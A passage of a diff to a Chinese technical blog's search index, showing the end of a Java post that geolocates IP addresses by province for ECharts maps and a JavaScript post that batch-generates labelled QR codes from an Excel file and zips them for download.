provinceMap.put(&quot;内蒙古&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;陕西&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;吉林&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;福建&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;贵州&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;广东&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;青海&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;西藏&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;四川&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;宁夏&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;海南&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;台湾&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;香港&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;澳门&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;其他&quot;, 0);</span><br><span class="line"></span><br><span class="line">		Map&lt;String, Integer&gt; provinceGeoIpMap = new HashMap&lt;String, Integer&gt;();</span><br><span class="line">		provinceGeoIpMap.put(&quot;Beijing&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Tianjin&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Shanghai&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Chongqing&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Hebei&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Hainan&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Yunnan&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Liaoning&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Heilongjiang&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Hunan&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Anhui&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Shandong&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Xinjiang&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Jiangsu&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Zhejiang&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Jiangxi&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Hubei&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Guangxi&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Gansu&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Shanxi&quot;, 0); // 山西</span><br><span class="line">		provinceGeoIpMap.put(&quot;Inner Mongolia Autonomous Region&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Shaanxi&quot;, 0); // 陕西</span><br><span class="line">		provinceGeoIpMap.put(&quot;Jilin&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Fujian&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Guizhou&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Guangdong&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Qinghai&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Tibet&quot;, 0); // 西藏</span><br><span class="line">		provinceGeoIpMap.put(&quot;Sichuan&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Ningxia Hui Autonomous Region&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Hainan&quot;, 0);</span><br><span class="line"></span><br><span class="line">		StringBuffer other = new StringBuffer();</span><br><span class="line"></span><br><span class="line">		try &#123;</span><br><span class="line"></span><br><span class="line">			for (int i = 0; i &lt; ips.length; i++) &#123;</span><br><span class="line">				// 获取ip.cn的页面内容</span><br><span class="line">				Document html = httpGet(&quot;https://ip.cn/?ip=&quot; + ips[i], null);</span><br><span class="line">				Elements pelements = html.getElementsByClass(&quot;well&quot;).get(0).getElementsByTag(&quot;p&quot;);</span><br><span class="line">				// 所在地理位置</span><br><span class="line">				String addresStr = pelements.get(1).getElementsByTag(&quot;code&quot;).text();</span><br><span class="line">				String provinceAddresStr = addresStr.substring(0, 2);</span><br><span class="line">				// GeoIP(局域网以及特殊ip没有)</span><br><span class="line">				String geoIpStr = pelements.size() == 3 ? pelements.get(2).getElementsByTag(&quot;code&quot;).text() : &quot;&quot;;</span><br><span class="line">				String[] geoIpAry = geoIpStr.split(&quot;, &quot;);</span><br><span class="line">				String provinceGeoIpStr = 1 &lt; geoIpAry.length ? geoIpAry[geoIpAry.length - 2]</span><br><span class="line">						: 0 &lt; geoIpAry.length ? geoIpAry[0] : &quot;&quot;;</span><br><span class="line"></span><br><span class="line">				System.out.println(i + &quot;\t&quot; + provinceAddresStr + &quot;\t&quot; + provinceGeoIpStr);</span><br><span class="line">				// 根据所在地理位置判断</span><br><span class="line">				if (provinceMap.get(provinceAddresStr) == null) &#123;</span><br><span class="line">					// 根据GeoIP判断</span><br><span class="line">					if (provinceGeoIpMap.get(provinceGeoIpStr) == null) &#123;</span><br><span class="line">						// 其他</span><br><span class="line">						provinceMap.put(&quot;其他&quot;, provinceMap.get(&quot;其他&quot;) + 1);</span><br><span class="line">						other.append(i + &quot;\t&quot; + ips[i] + &quot;\t&quot; + addresStr + &quot;\t&quot; + geoIpStr + &quot;\r\n&quot;);</span><br><span class="line">					&#125; else &#123;</span><br><span class="line">						provinceGeoIpMap.put(provinceGeoIpStr, provinceGeoIpMap.get(provinceGeoIpStr) + 1);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125; else &#123;</span><br><span class="line">					provinceMap.put(provinceAddresStr, provinceMap.get(provinceAddresStr) + 1);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125; catch (SocketException se) &#123;</span><br><span class="line">			System.out.println(&quot;连接超时，请从最后的下标继续执行，然后手动合并数据。&quot;);</span><br><span class="line">			se.printStackTrace();</span><br><span class="line">		&#125; catch (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; finally &#123;</span><br><span class="line">			try &#123;</span><br><span class="line">				margeCount(provinceMap, provinceGeoIpMap);</span><br><span class="line">				StringBuffer result = new StringBuffer();</span><br><span class="line">				provinceMap.forEach((k, v) -&gt; &#123;</span><br><span class="line">					result.append(&quot;&#123;name: &apos;&quot;).append(k).append(&quot;&apos;,value: &quot;).append(v).append(&quot;&#125;,&quot;);</span><br><span class="line">				&#125;);</span><br><span class="line">				System.out.println(result.toString());</span><br><span class="line">				System.out.println(other);</span><br><span class="line">				// 保存其他数据</span><br><span class="line">				FileOutputStream fos = new FileOutputStream(new File(&quot;D:\\otherIP.txt&quot;));</span><br><span class="line">				fos.write(other.toString().getBytes());</span><br><span class="line">				fos.close();</span><br><span class="line">			&#125; catch (Exception e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/**</span><br><span class="line">	 * httGet请求</span><br><span class="line">	 */</span><br><span class="line">	private static Document httpGet(String url, String cookie) throws IOException &#123;</span><br><span class="line">		Connection con = Jsoup.connect(url);</span><br><span class="line">		// 请求头设置</span><br><span class="line">		con.header(&quot;Accept&quot;, &quot;*/*&quot;);</span><br><span class="line">		con.header(&quot;User-Agent&quot;,</span><br><span class="line">				&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&quot;);</span><br><span class="line">		if (StringUtils.isNotEmpty(cookie)) &#123;</span><br><span class="line">			// cookie设置</span><br><span class="line">			con.header(&quot;Cookie&quot;, cookie);</span><br><span class="line">		&#125;</span><br><span class="line">		return con.get();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/**</span><br><span class="line">	 * 数据合并</span><br><span class="line">	 */</span><br><span class="line">	private static void margeCount(Map&lt;String, Integer&gt; targetMap, Map&lt;String, Integer&gt; addMap) &#123;</span><br><span class="line">		targetMap.put(&quot;北京&quot;, targetMap.get(&quot;北京&quot;) + addMap.get(&quot;Beijing&quot;));</span><br><span class="line">		targetMap.put(&quot;天津&quot;, targetMap.get(&quot;天津&quot;) + addMap.get(&quot;Tianjin&quot;));</span><br><span class="line">		targetMap.put(&quot;上海&quot;, targetMap.get(&quot;上海&quot;) + addMap.get(&quot;Shanghai&quot;));</span><br><span class="line">		targetMap.put(&quot;重庆&quot;, targetMap.get(&quot;重庆&quot;) + addMap.get(&quot;Chongqing&quot;));</span><br><span class="line">		targetMap.put(&quot;河北&quot;, targetMap.get(&quot;河北&quot;) + addMap.get(&quot;Hebei&quot;));</span><br><span class="line">		targetMap.put(&quot;河南&quot;, targetMap.get(&quot;河南&quot;) + addMap.get(&quot;Hainan&quot;));</span><br><span class="line">		targetMap.put(&quot;云南&quot;, targetMap.get(&quot;云南&quot;) + addMap.get(&quot;Yunnan&quot;));</span><br><span class="line">		targetMap.put(&quot;辽宁&quot;, targetMap.get(&quot;辽宁&quot;) + addMap.get(&quot;Liaoning&quot;));</span><br><span class="line">		targetMap.put(&quot;黑龙江&quot;, targetMap.get(&quot;黑龙&quot;) + addMap.get(&quot;Heilongjiang&quot;));</span><br><span class="line">		targetMap.remove(&quot;黑龙&quot;);</span><br><span class="line">		targetMap.put(&quot;湖南&quot;, targetMap.get(&quot;湖南&quot;) + addMap.get(&quot;Hunan&quot;));</span><br><span class="line">		targetMap.put(&quot;安徽&quot;, targetMap.get(&quot;安徽&quot;) + addMap.get(&quot;Anhui&quot;));</span><br><span class="line">		targetMap.put(&quot;山东&quot;, targetMap.get(&quot;山东&quot;) + addMap.get(&quot;Shandong&quot;));</span><br><span class="line">		targetMap.put(&quot;新疆&quot;, targetMap.get(&quot;新疆&quot;) + addMap.get(&quot;Xinjiang&quot;));</span><br><span class="line">		targetMap.put(&quot;江苏&quot;, targetMap.get(&quot;江苏&quot;) + addMap.get(&quot;Jiangsu&quot;));</span><br><span class="line">		targetMap.put(&quot;浙江&quot;, targetMap.get(&quot;浙江&quot;) + addMap.get(&quot;Zhejiang&quot;));</span><br><span class="line">		targetMap.put(&quot;江西&quot;, targetMap.get(&quot;江西&quot;) + addMap.get(&quot;Jiangxi&quot;));</span><br><span class="line">		targetMap.put(&quot;湖北&quot;, targetMap.get(&quot;湖北&quot;) + addMap.get(&quot;Hubei&quot;));</span><br><span class="line">		targetMap.put(&quot;广西&quot;, targetMap.get(&quot;广西&quot;) + addMap.get(&quot;Guangxi&quot;));</span><br><span class="line">		targetMap.put(&quot;甘肃&quot;, targetMap.get(&quot;甘肃&quot;) + addMap.get(&quot;Gansu&quot;));</span><br><span class="line">		targetMap.put(&quot;山西&quot;, targetMap.get(&quot;山西&quot;) + addMap.get(&quot;Shanxi&quot;));</span><br><span class="line">		targetMap.put(&quot;内蒙古&quot;, targetMap.get(&quot;内蒙&quot;) + addMap.get(&quot;Inner Mongolia Autonomous Region&quot;));</span><br><span class="line">		targetMap.remove(&quot;内蒙&quot;);</span><br><span class="line">		targetMap.put(&quot;陕西&quot;, targetMap.get(&quot;陕西&quot;) + addMap.get(&quot;Shaanxi&quot;));</span><br><span class="line">		targetMap.put(&quot;吉林&quot;, targetMap.get(&quot;吉林&quot;) + addMap.get(&quot;Jilin&quot;));</span><br><span class="line">		targetMap.put(&quot;福建&quot;, targetMap.get(&quot;福建&quot;) + addMap.get(&quot;Fujian&quot;));</span><br><span class="line">		targetMap.put(&quot;贵州&quot;, targetMap.get(&quot;贵州&quot;) + addMap.get(&quot;Guizhou&quot;));</span><br><span class="line">		targetMap.put(&quot;广东&quot;, targetMap.get(&quot;广东&quot;) + addMap.get(&quot;Guangdong&quot;));</span><br><span class="line">		targetMap.put(&quot;青海&quot;, targetMap.get(&quot;青海&quot;) + addMap.get(&quot;Qinghai&quot;));</span><br><span class="line">		targetMap.put(&quot;西藏&quot;, targetMap.get(&quot;西藏&quot;) + addMap.get(&quot;Tibet&quot;));</span><br><span class="line">		targetMap.put(&quot;四川&quot;, targetMap.get(&quot;四川&quot;) + addMap.get(&quot;Sichuan&quot;));</span><br><span class="line">		targetMap.put(&quot;宁夏&quot;, targetMap.get(&quot;宁夏&quot;) + addMap.get(&quot;Ningxia Hui Autonomous Region&quot;));</span><br><span class="line">		targetMap.put(&quot;海南&quot;, targetMap.get(&quot;海南&quot;) + addMap.get(&quot;Hainan&quot;));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据生成的文本替换Echart的数据，展示效果如下。<br><img src="/img/20200402/2.png" alt><br><a href="https://xuchunlei.top/ipDistributionMap" target="_blank">IP地址分布地图Echarts代码页面</a></p>
+<p><img src="/img/20200402/3.png" alt><br><a href="https://xuchunlei.top/ipDistributionPie" target="_blank">IP地址分布饼状图Echarts代码页面</a></p>
 ]]></content>
       <tags>
         <tag>Java</tag>
@@ -231,6 +231,43 @@
         <tag>Java</tag>
         <tag>IP</tag>
         <tag>Echarts</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JS读取EXCEL文件批量生成带描述的二维码并打包下载</title>
+    <url>/2022/03/24/JS%E8%AF%BB%E5%8F%96EXCEL%E6%96%87%E4%BB%B6%E6%89%B9%E9%87%8F%E7%94%9F%E6%88%90%E5%B8%A6%E6%8F%8F%E8%BF%B0%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81%E5%B9%B6%E6%89%93%E5%8C%85%E4%B8%8B%E8%BD%BD/</url>
+    <content><![CDATA[<p><em>起因是朋友二月上旬想让我做个程序，本来打算二月底给他弄一下的，结果赶上出差就搁置了。直到三月初出差回来，打算周末搞的，结果朋友在周末之前催，奈何时间太紧，决定当天JS快速搞一下，只实现了简单的功能。谁知朋友问的时候，已经找别人做好了……虽然有完成的，但是期间还找过我几次。最后不用我的，但觉得一直烂尾不好（第二次修改其实已经实现了大部分要求），今天就把未实现（打包下载）的坑填上，简单记录一下</em></p>
+<h3 id="用到的第三方JS库"><a href="#用到的第三方JS库" class="headerlink" title="用到的第三方JS库"></a>用到的第三方JS库</h3><ul>
+<li>Excel读取<ul>
+<li>SheetJS <a href="https://github.com/SheetJS/sheetjs" target="_blank" rel="noopener">https://github.com/SheetJS/sheetjs</a></li>
+</ul>
+</li>
+<li>二维码生成<ul>
+<li>jquery.qrcode.js <a href="https://github.com/jeromeetienne/jquery-qrcode" target="_blank" rel="noopener">https://github.com/jeromeetienne/jquery-qrcode</a></li>
+</ul>
+</li>
+<li>压缩打包<ul>
+<li>JSZip <a href="https://github.com/Stuk/jszip" target="_blank" rel="noopener">https://github.com/Stuk/jszip</a></li>
+</ul>
+</li>
+<li>文件保存<ul>
+<li>FileSaver.js <a href="https://github.com/eligrey/FileSaver.js" target="_blank" rel="noopener">https://github.com/eligrey/FileSaver.js</a></li>
+</ul>
+</li>
+</ul>
+<p>JQuery就不说明了，这里根据需求还需要Base64编码<br>js-base64 <a href="https://github.com/dankogai/js-base64" target="_blank" rel="noopener">https://github.com/dankogai/js-base64</a></p>
+<h3 id="主要代码"><a href="#主要代码" class="headerlink" title="主要代码"></a>主要代码</h3><p>代码仅供参考，读取的文件对格式有要求，需要按照自己的需求来，这里就不列出对文本处理的部分了。</p>
+<h4 id="HTML部分"><a href="#HTML部分" class="headerlink" title="HTML部分"></a>HTML部分</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div&gt;</span><br><span class="line">		&lt;span&gt;①选择Excel文件(格式固定)：&lt;/span&gt;</span><br><span class="line">		&lt;/br&gt;</span><br><span class="line">		&lt;input type=&quot;file&quot; onchange=&quot;readWorkbookFromLocalFile(this.files[0])&quot; accept=&quot;application/vnd.openxmlformats-officedocument.spreadsheetml.sheet&quot;&gt;</span><br><span class="line">		&lt;/br&gt;</span><br><span class="line">		&lt;span&gt;②二维码内容预览(可修改)：&lt;/span&gt;</span><br><span class="line">		&lt;/br&gt;</span><br><span class="line">		&lt;textarea id=&quot;target&quot; cols=&quot;100&quot; rows=&quot;20&quot;&gt;&lt;/textarea&gt;</span><br><span class="line">		&lt;/br&gt;</span><br><span class="line">		&lt;span&gt;③生成下载二维码：&lt;/span&gt;</span><br><span class="line">		&lt;/br&gt;</span><br><span class="line">		&lt;button onclick=&quot;getQRImg()&quot;&gt;生成下载二维码&lt;/button&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">	&lt;div id=&quot;codeArea&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="读取Excel文件"><a href="#读取Excel文件" class="headerlink" title="读取Excel文件"></a>读取Excel文件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 读取Excel文件</span><br><span class="line">function readWorkbookFromLocalFile(file, callback) &#123;</span><br><span class="line">	var reader = new FileReader();</span><br><span class="line">	reader.onload = function(e) &#123;</span><br><span class="line">		var data = e.target.result;</span><br><span class="line">		// 读取二进制的excel</span><br><span class="line">		var workbook = XLSX.read(data, &#123;type: &apos;binary&apos;&#125;);</span><br><span class="line">		var outText = XLSX.utils.sheet_to_txt(workbook.Sheets[workbook.SheetNames[0]]).replace(/\t/g, &apos;,&apos;);</span><br><span class="line">		// 去除最后一个换行符</span><br><span class="line">		outText = outText.substring(0, outText.length -1);</span><br><span class="line">		$(&quot;#target&quot;).val(outText);</span><br><span class="line">		if(callback) callback(workbook);</span><br><span class="line">	&#125;;</span><br><span class="line">	reader.readAsBinaryString(file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="生成带描述的二维码并打包下载"><a href="#生成带描述的二维码并打包下载" class="headerlink" title="生成带描述的二维码并打包下载"></a>生成带描述的二维码并打包下载</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var zip = new JSZip();</span><br><span class="line">// 生成二维码</span><br><span class="line">function makeQR(arr) &#123;</span><br><span class="line">	if (arr) &#123;</span><br><span class="line">		arr.reduce(function(per, current, index) &#123;</span><br><span class="line">			// 二维码页面显示(先生成html结构再生成二维码)</span><br><span class="line">			var html = `&lt;div id=&apos;code$&#123;index&#125;&apos; class=&apos;codeStyle&apos;&gt;&lt;/div&gt;`;</span><br><span class="line">			$(&quot;#codeArea&quot;).append(html);</span><br><span class="line">			var qrcode = $(&apos;#code&apos; + index).qrcode(&#123;</span><br><span class="line">				width: 140,</span><br><span class="line">				height: 140,</span><br><span class="line">				text: current</span><br><span class="line">			&#125;);</span><br><span class="line"></span><br><span class="line">			// 二维码添加文字描述</span><br><span class="line">			var canvas = qrcode.find(&apos;canvas&apos;).get(0);</span><br><span class="line">			var img = new Image();</span><br><span class="line">			img.src = canvas.toDataURL(&apos;image/png&apos;);</span><br><span class="line">			img.onload = function() &#123;</span><br><span class="line">				canvas.width = 140;</span><br><span class="line">				canvas.height = 180;</span><br><span class="line">				var ctx = canvas.getContext(&apos;2d&apos;);</span><br><span class="line">				//设置画布背景</span><br><span class="line">				ctx.fillStyle = &apos;#ffffff&apos;;</span><br><span class="line">				ctx.fillRect(0, 0, canvas.width, canvas.height);</span><br><span class="line">				//设置文字样式</span><br><span class="line">				ctx.fillStyle = &apos;#000000&apos;;</span><br><span class="line">				ctx.font = &apos;bold &apos; + 14 + &apos;px Arial&apos;;</span><br><span class="line">				ctx.textAlign = &apos;center&apos;;</span><br><span class="line">				//文字描述</span><br><span class="line">				ctx.fillText(nameList[index].split(&apos; &apos;)[0], 80, 155);</span><br><span class="line">				ctx.font = &apos;13px Arial&apos;;</span><br><span class="line">				ctx.textAlign = &apos;left&apos;;</span><br><span class="line">				ctx.fillText(nameList[index].split(&apos; &apos;)[1], 0, 170);</span><br><span class="line">				//绘制二维码</span><br><span class="line">				ctx.drawImage(img, 0, 0);</span><br><span class="line"></span><br><span class="line">				// canvas转成路径 取出base64数据</span><br><span class="line">				var imgdata = canvas.toDataURL(&apos;image/png&apos;).split(&apos;,&apos;)[1];</span><br><span class="line">				// 根据村名创建文件夹</span><br><span class="line">				imgFolder = zip.folder(Base64.decode(current.split(&quot;,&quot;)[4]));</span><br><span class="line">				imgFolder.file(nameList[index] + &apos;.png&apos;, imgdata, &#123; base64: true &#125;);</span><br><span class="line">				// 全部完成后打包下载</span><br><span class="line">				if (index == nameList.length -1) &#123;</span><br><span class="line">					zip.generateAsync(&#123; type: &quot;blob&quot; &#125;).then(function(content) &#123;</span><br><span class="line">						saveAs(content, &quot;QRCode.zip&quot;);</span><br><span class="line">					&#125;);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;, 0)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后来张效果图（随便弄了张，差不多都是敏感信息，全是码）<br><img src="/img/20220324/1.jpg" alt></p>
+]]></content>
+      <tags>
+        <tag>JavaScript</tag>
+        <tag>二维码</tag>
       </tags>
   </entry>
   <entry>
@@ -334,40 +371,94 @@
       </tags>
   </entry>
   <entry>
-    <title>JS读取EXCEL文件批量生成带描述的二维码并打包下载</title>
-    <url>/2022/03/24/JS%E8%AF%BB%E5%8F%96EXCEL%E6%96%87%E4%BB%B6%E6%89%B9%E9%87%8F%E7%94%9F%E6%88%90%E5%B8%A6%E6%8F%8F%E8%BF%B0%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81%E5%B9%B6%E6%89%93%E5%8C%85%E4%B8%8B%E8%BD%BD/</url>
-    <content><![CDATA[<p><em>起因是朋友二月上旬想让我做个程序，本来打算二月底给他弄一下的，结果赶上出差就搁置了。直到三月初出差回来，打算周末搞的，结果朋友在周末之前催，奈何时间太紧，决定当天JS快速搞一下，只实现了简单的功能。谁知朋友问的时候，已经找别人做好了……虽然有完成的，但是期间还找过我几次。最后不用我的，但觉得一直烂尾不好（第二次修改其实已经实现了大部分要求），今天就把未实现（打包下载）的坑填上，简单记录一下</em></p>
-<h3 id="用到的第三方JS库"><a href="#用到的第三方JS库" class="headerlink" title="用到的第三方JS库"></a>用到的第三方JS库</h3><ul>
-<li>Excel读取<ul>
-<li>SheetJS <a href="https://github.com/SheetJS/sheetjs" target="_blank" rel="noopener">https://github.com/SheetJS/sheetjs</a></li>
-</ul>
-</li>
-<li>二维码生成<ul>
-<li>jquery.qrcode.js <a href="https://github.com/jeromeetienne/jquery-qrcode" target="_blank" rel="noopener">https://github.com/jeromeetienne/jquery-qrcode</a></li>
-</ul>
-</li>
-<li>压缩打包<ul>
-<li>JSZip <a href="https://github.com/Stuk/jszip" target="_blank" rel="noopener">https://github.com/Stuk/jszip</a></li>
-</ul>
-</li>
-<li>文件保存<ul>
-<li>FileSaver.js <a href="https://github.com/eligrey/FileSaver.js" target="_blank" rel="noopener">https://github.com/eligrey/FileSaver.js</a></li>
-</ul>
-</li>
-</ul>
-<p>JQuery就不说明了，这里根据需求还需要Base64编码<br>js-base64 <a href="https://github.com/dankogai/js-base64" target="_blank" rel="noopener">https://github.com/dankogai/js-base64</a></p>
-<h3 id="主要代码"><a href="#主要代码" class="headerlink" title="主要代码"></a>主要代码</h3><p>代码仅供参考，读取的文件对格式有要求，需要按照自己的需求来，这里就不列出对文本处理的部分了。</p>
-<h4 id="HTML部分"><a href="#HTML部分" class="headerlink" title="HTML部分"></a>HTML部分</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div&gt;</span><br><span class="line">		&lt;span&gt;①选择Excel文件(格式固定)：&lt;/span&gt;</span><br><span class="line">		&lt;/br&gt;</span><br><span class="line">		&lt;input type=&quot;file&quot; onchange=&quot;readWorkbookFromLocalFile(this.files[0])&quot; accept=&quot;application/vnd.openxmlformats-officedocument.spreadsheetml.sheet&quot;&gt;</span><br><span class="line">		&lt;/br&gt;</span><br><span class="line">		&lt;span&gt;②二维码内容预览(可修改)：&lt;/span&gt;</span><br><span class="line">		&lt;/br&gt;</span><br><span class="line">		&lt;textarea id=&quot;target&quot; cols=&quot;100&quot; rows=&quot;20&quot;&gt;&lt;/textarea&gt;</span><br><span class="line">		&lt;/br&gt;</span><br><span class="line">		&lt;span&gt;③生成下载二维码：&lt;/span&gt;</span><br><span class="line">		&lt;/br&gt;</span><br><span class="line">		&lt;button onclick=&quot;getQRImg()&quot;&gt;生成下载二维码&lt;/button&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">	&lt;div id=&quot;codeArea&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="读取Excel文件"><a href="#读取Excel文件" class="headerlink" title="读取Excel文件"></a>读取Excel文件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 读取Excel文件</span><br><span class="line">function readWorkbookFromLocalFile(file, callback) &#123;</span><br><span class="line">	var reader = new FileReader();</span><br><span class="line">	reader.onload = function(e) &#123;</span><br><span class="line">		var data = e.target.result;</span><br><span class="line">		// 读取二进制的excel</span><br><span class="line">		var workbook = XLSX.read(data, &#123;type: &apos;binary&apos;&#125;);</span><br><span class="line">		var outText = XLSX.utils.sheet_to_txt(workbook.Sheets[workbook.SheetNames[0]]).replace(/\t/g, &apos;,&apos;);</span><br><span class="line">		// 去除最后一个换行符</span><br><span class="line">		outText = outText.substring(0, outText.length -1);</span><br><span class="line">		$(&quot;#target&quot;).val(outText);</span><br><span class="line">		if(callback) callback(workbook);</span><br><span class="line">	&#125;;</span><br><span class="line">	reader.readAsBinaryString(file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="生成带描述的二维码并打包下载"><a href="#生成带描述的二维码并打包下载" class="headerlink" title="生成带描述的二维码并打包下载"></a>生成带描述的二维码并打包下载</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var zip = new JSZip();</span><br><span class="line">// 生成二维码</span><br><span class="line">function makeQR(arr) &#123;</span><br><span class="line">	if (arr) &#123;</span><br><span class="line">		arr.reduce(function(per, current, index) &#123;</span><br><span class="line">			// 二维码页面显示(先生成html结构再生成二维码)</span><br><span class="line">			var html = `&lt;div id=&apos;code$&#123;index&#125;&apos; class=&apos;codeStyle&apos;&gt;&lt;/div&gt;`;</span><br><span class="line">			$(&quot;#codeArea&quot;).append(html);</span><br><span class="line">			var qrcode = $(&apos;#code&apos; + index).qrcode(&#123;</span><br><span class="line">				width: 140,</span><br><span class="line">				height: 140,</span><br><span class="line">				text: current</span><br><span class="line">			&#125;);</span><br><span class="line"></span><br><span class="line">			// 二维码添加文字描述</span><br><span class="line">			var canvas = qrcode.find(&apos;canvas&apos;).get(0);</span><br><span class="line">			var img = new Image();</span><br><span class="line">			img.src = canvas.toDataURL(&apos;image/png&apos;);</span><br><span class="line">			img.onload = function() &#123;</span><br><span class="line">				canvas.width = 140;</span><br><span class="line">				canvas.height = 180;</span><br><span class="line">				var ctx = canvas.getContext(&apos;2d&apos;);</span><br><span class="line">				//设置画布背景</span><br><span class="line">				ctx.fillStyle = &apos;#ffffff&apos;;</span><br><span class="line">				ctx.fillRect(0, 0, canvas.width, canvas.height);</span><br><span class="line">				//设置文字样式</span><br><span class="line">				ctx.fillStyle = &apos;#000000&apos;;</span><br><span class="line">				ctx.font = &apos;bold &apos; + 14 + &apos;px Arial&apos;;</span><br><span class="line">				ctx.textAlign = &apos;center&apos;;</span><br><span class="line">				//文字描述</span><br><span class="line">				ctx.fillText(nameList[index].split(&apos; &apos;)[0], 80, 155);</span><br><span class="line">				ctx.font = &apos;13px Arial&apos;;</span><br><span class="line">				ctx.textAlign = &apos;left&apos;;</span><br><span class="line">				ctx.fillText(nameList[index].split(&apos; &apos;)[1], 0, 170);</span><br><span class="line">				//绘制二维码</span><br><span class="line">				ctx.drawImage(img, 0, 0);</span><br><span class="line"></span><br><span class="line">				// canvas转成路径 取出base64数据</span><br><span class="line">				var imgdata = canvas.toDataURL(&apos;image/png&apos;).split(&apos;,&apos;)[1];</span><br><span class="line">				// 根据村名创建文件夹</span><br><span class="line">				imgFolder = zip.folder(Base64.decode(current.split(&quot;,&quot;)[4]));</span><br><span class="line">				imgFolder.file(nameList[index] + &apos;.png&apos;, imgdata, &#123; base64: true &#125;);</span><br><span class="line">				// 全部完成后打包下载</span><br><span class="line">				if (index == nameList.length -1) &#123;</span><br><span class="line">					zip.generateAsync(&#123; type: &quot;blob&quot; &#125;).then(function(content) &#123;</span><br><span class="line">						saveAs(content, &quot;QRCode.zip&quot;);</span><br><span class="line">					&#125;);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;, 0)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>最后来张效果图（随便弄了张，差不多都是敏感信息，全是码）<br><img src="/img/20220324/1.jpg" alt></p>
+    <title>MySQL借助Excel快速区间分段统计（客单价分布 IOS账单分月）</title>
+    <url>/2022/08/27/MySQL%E5%80%9F%E5%8A%A9Excel%E5%BF%AB%E9%80%9F%E5%8C%BA%E9%97%B4%E5%88%86%E6%AE%B5%E7%BB%9F%E8%AE%A1%EF%BC%88%E5%AE%A2%E5%8D%95%E4%BB%B7%E5%88%86%E5%B8%83%20IOS%E8%B4%A6%E5%8D%95%E5%88%86%E6%9C%88%EF%BC%89/</url>
